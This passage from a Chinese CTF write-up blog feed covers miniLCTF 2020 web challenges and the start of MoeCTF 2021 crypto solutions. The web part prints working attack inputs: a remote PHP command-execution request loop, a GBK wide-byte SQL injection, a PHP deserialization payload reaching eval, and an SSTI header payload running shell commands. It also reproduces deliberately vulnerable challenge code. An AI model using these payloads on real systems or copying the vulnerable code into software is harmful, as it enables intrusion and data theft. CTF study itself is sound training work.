data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">+=</span> <span class=\"token string\">'?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\\ny\\n120\\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">'minil'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#不用延时的话一直都是 docker 准备状态 ):</span></pre></td></tr></table></figure><p>// Frank 注：你们为什么都这么喜欢暴力啊啊啊啊啊 怪我心软了给你们模了 100</p>\n<h3 id=\"are-you-reclu3e-author-blackwatch\"><a class=\"anchor\" href=\"#are-you-reclu3e-author-blackwatch\">#</a> are you reclu3e?| Author: blackwatch</h3>\n<p>扫出来了 .index.php.swp .login.php.swp</p>\n<p>vim -r 还原</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>login.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"connection.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"SET CHARACTER SET 'gbk'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'please post your username'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from users where username='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span><span class=\"token constant\">MYSQLI_ASSOC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'you are not reclu3e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'I know you are reclu3e but you need post the right password'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script>alert(\"Yes! you are reclu3e\")&lt;/script>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>alert('<span class=\"token interpolation\"><span class=\"token variable\">$msg</span></span>')&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$conn</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script type='text/javascript'>\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"window.location.href='index.php'\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/script>\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>index<span class=\"token operator\">.</span>php</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$flag=\"minilctf&#123;****&#125;\";</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"loginForm.html\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;h1>Hello, reclu3e!&lt;/h1>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token variable\">$p</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"p\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"p\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">person</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$weight</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$height</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$serialize</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">serialize</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">serialize</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$s=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">serialize</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\";'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>login 逻辑是判断输入的密码和取出的 usr 对应的密码比较，插表，GBK+addslashes 宽字节注入</p>\n<pre><code>username=reclu3e%df%27%20union%20select%201,2%23&amp;password=2\n</code></pre>\n<p>php 反序列化漏洞，private 变量名前后要用 %00</p>\n<p><code>@eval('$s=&quot;'.$this-&gt;serialize.'&quot;;');</code>  用 &quot;; 闭合前后</p>\n<pre><code>/index.php?p= O:6:&quot;person&quot;:5:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:6:&quot;weight&quot;;i:0;s:6:&quot;height&quot;;i:0;s:17:&quot;%00person%00serialize&quot;;s:30:&quot;&quot;;high\n</code></pre>\n<h2 id=\"ip-echo-service\"><a class=\"anchor\" href=\"#ip-echo-service\">#</a> IP echo service</h2>\n<p>本题考点为<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY3OSN0b2MtMQ==\"> ssti 注入</span>，而且过滤了双下划线 <code>__</code> ，百度过滤后的注入方法，先构造 get 请求</p>\n<pre><code>?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__('os').popen('cat /flag').read()\n</code></pre>\n<p>再伪造 ip 利用 ssti 漏洞进行注入</p>\n<pre><code>X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)&#125;&#125;\n</code></pre>\n<p>得到 flag</p>\n<p><a href=\"https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67\"><img data-src=\"https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67\" alt=\"image-20200509183253437\" /></a></p>\n<h2 id=\"ezlogin\"><a class=\"anchor\" href=\"#ezlogin\">#</a> ezlogin</h2>\n<p>过滤逗号等号的无列名注入，PHP 反序列化字符逃逸</p>\n<p>注入做的非预期：</p>\n<pre><code>logname=1&quot;||1 limit 1 offset 3#&amp;logpass=1\n</code></pre>\n<p>得到 <code>alert('Username:Flag_1s_heRe \\nPassword:goto /flag327a6c4304a')</code> ，访问。</p>\n<pre><code>$key = array('php','flag','xdsec');\n$filter = '/'.implode('|',$key).'/i';\nreturn preg_replace($filter,'hack!!!!',$payload);\n</code></pre>\n<p>php 关键字被替换为 hack!!!! 之后，从 3 个字符变成了 5 个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。</p>\n<pre><code>payload=phpphpphpphpphpphpphp&quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125;\n</code></pre>\n<p 7f3ea366-f5ab-463c-b511-af63d6dc7715=\"\">minil</p>\n<p>题目思路来源<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw\">西电安全协会</span></p>\n",
            "tags": [
                "computer-science",
                "CTF",
                "Reverse",
                "Misc",
                "Web"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/moeCTF_2021%E9%A2%98%E8%A7%A3/",
            "url": "https://zephyr-cyber.github.io.git/moeCTF_2021%E9%A2%98%E8%A7%A3/",
            "title": "MoeCTF_2021题解",
            "date_published": "2021-12-15T05:19:59.010Z",
            "content_html": "<h1 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h2 id=\"beginofcrypto\"><a class=\"anchor\" href=\"#beginofcrypto\">#</a> <em><strong>beginOfCrypto</strong></em></h2>\n<blockquote>\n<blockquote>\n<p>看一下代码～<br />\nord 是把 flag 的每一个字符转成数字，map 则是一个用来迭代的函数，也就是对 flag 里的每一个字符 ord，list 转成列表之后存进 data 列表里。之后的 for 循环把 data 列表里的数字取 e 的指数，并把结果存在 cip 列表里。<br />\n知道加密过程之后就很简单了～我们只需要把 cip 取 e 的对数，然后转成字符输出就可以了～<s>第一题真是很温柔呢</s></p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cip<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">2.178203880729008e+47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.6094870669615087e+48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7.307059979368028e+43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9.889030319346894e+42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2.3886906014249767e+50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.9862648361376436e+44</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token number\">2.6195173187490456e+53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9.889030319346894e+42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7.016735912097614e+20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2.178203880729008e+47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7.307059979368028e+43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.811239082889014e+41</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token number\">1.6094870669615087e+48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5.920972027664636e+47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">214643579785915.7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.6379709476087856e+42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7.307059979368028e+43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5.399227610580139e+44</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token number\">3.989519570547194e+45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5.920972027664636e+47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.811239082889014e+41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.5451311827611436e+52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.6094870669615087e+48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6.493134255664421e+50</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token number\">3.23274119108484e+49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.811239082889014e+41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.2523631708422093e+29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.23274119108484e+49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.5451311827611436e+52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.375039447261315e+48</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token number\">2.3886906014249767e+50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7.016735912097614e+20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.811239082889014e+41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9.889030319346894e+42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.831008000716566e+22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.23274119108484e+49</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token number\">1.4093490824269349e+22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.4093490824269349e+22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.23274119108484e+49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.9355760420357097e+54</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">(</span>cip<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>math<span class=\"token punctuation\">.</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#moectf&#123;c0me_on!begin_your_Crypt0_c4r33r&#125;</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>BabyMultiple</strong></em></p>\n<blockquote>\n<p>看代码，大概意思就是把 flag 用 encode 函数进行了一次加密。跟第一题一样，逆向去写解密脚本就好了～<br />\n<s> 不过由于懒得动脑子了，</s> 可以观察一下，这个题是属于单字符加密，也就是一个明文字符对应一个确定的密文字符，所以我们可以直接把所有字符的加密结果都打印出来，然后在里边找我们需要的字符就好了。<br />\n这里我把所有字符的加密后结果放在 cyberlist 里。</p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cyberlist<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a61WRMHCxsnid94ZUPKFAvqlgb72XSNIDytoje_50VQLGBwrmhc83YTOJEzupkf\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">'g3AfJPOfHPOJFfJuf_AYux1JFx39'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    j<span class=\"token operator\">=</span>cyberlist<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#y0u_4r3_gr34t_47_Mu17ic4ti0n</span></pre></td></tr></table></figure><blockquote>\n<p><em><strong>LazyRSA</strong></em></p>\n<blockquote>\n<p>一个简单的 RSA 加密<br />\n求 (p-1)*(q-1) 的逆元可以用 gmpy2 库的 invert，然后 pow 一下就好了<br />\n<s> by the way: 这两个库真难装・・・・・・</s></p>\n</blockquote>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span>  <span class=\"token number\">7049120988661090136959367990211624032671088374397430253722914704672269343351268486642692858477617370573493581346846411168539408811542592351582581576539221</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span>  <span class=\"token number\">11595461299251293002401295606096202123601375776115430944343338141843770078346355504245510150744085418550473572002573306023521368183889972175846278163010889</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span>  <span class=\"token number\">48425576447741107904942007362859939933300480519833273210397511573241220126734053813936424490872852942885069257318462762079636783871415500644717758273774268724488497979368196170897933989184449432995120246590652553995031347596620505647525475638040859263109628716173897321613612254357251120398449111747305089380</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token 